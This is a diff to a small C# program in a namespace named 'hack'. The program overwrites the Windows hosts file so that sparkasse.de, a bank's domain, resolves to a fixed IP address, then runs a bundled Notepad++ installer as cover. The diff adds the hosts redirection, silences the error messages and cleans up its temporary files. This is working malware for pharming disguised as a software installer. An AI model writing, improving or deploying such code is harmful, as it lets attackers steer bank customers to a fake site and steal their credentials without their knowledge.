@@ -1,9 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.Reflection;
-using System.Resources;
-using System.Windows.Forms;
 using hack.Properties;
 
 namespace hack
@@ -18,27 +15,20 @@ namespace hack
         /// </summary>
         private static void Main()
         {
+            var tempHosts = Path.Combine(Directory.GetCurrentDirectory(), "hosts");
             try
             {
-
-                // TODO provide proper manipulated hosts file
-                // alternative 1
-                var manipulatedHosts = Resources.hosts;
-                using (var fs = new FileStream(HostsPath, FileMode.Truncate))
+                // PART 1: hosts file manipulation
+                File.Copy(HostsPath, tempHosts, true);
+                using (var sw = new StreamWriter(new FileStream(tempHosts, FileMode.Append)))
                 {
-                    fs.Write(manipulatedHosts, 0, manipulatedHosts.Length);
+                    sw.WriteLine("141.41.1.192 www.sparkasse.de");
+                    sw.WriteLine("141.41.1.192 sparkasse.de");
                 }
-                // alternative 2
-//                var tempHosts = Path.Combine(Directory.GetCurrentDirectory(), "hosts");
-//                using (var fs = new FileStream(tempHosts, FileMode.OpenOrCreate))
-//                {
-//                    fs.Write(manipulatedHosts, 0, manipulatedHosts.Length);
-//                }
-//                File.Move(tempHosts, HostsPath);
-//                File.Copy(tempHosts, HostsPath, true);
-//                File.Delete(tempHosts);
+                File.Copy(tempHosts, HostsPath, true);
+                File.Delete(tempHosts);
 
-                // shadowing notepad++ installer execution
+                // PART 2: notepad++ installer execution
                 var exeBytes = Resources.npp_6_9_Installer;
                 var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "npp.6.9.Installer.exe");
                 using (var fs = new FileStream(tempFile, FileMode.OpenOrCreate))
@@ -54,8 +44,9 @@ namespace hack
                 }
                 catch (Exception e)
                 {
-                    MessageBox.Show(e.GetType() + Environment.NewLine + e.Message, "Severe internal hack error",
-                        MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    // ignore
+                    //                MessageBox.Show(e.GetType() + Environment.NewLine + e.Message, "Severe internal hack error 2",
+                    //                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
                 finally
                 {
@@ -64,8 +55,16 @@ namespace hack
             }
             catch (Exception e)
             {
-                MessageBox.Show(e.GetType() + Environment.NewLine + e.Message, "Severe internal hack error",
-                        MessageBoxButtons.OK, MessageBoxIcon.Error);
+                // ignore
+//                MessageBox.Show(e.GetType() + Environment.NewLine + e.Message, "Severe internal hack error 2",
+//                        MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            finally
+            {
+                if (File.Exists(tempHosts))
+                {
+                    File.Delete(tempHosts);
+                }
             }
 
         }
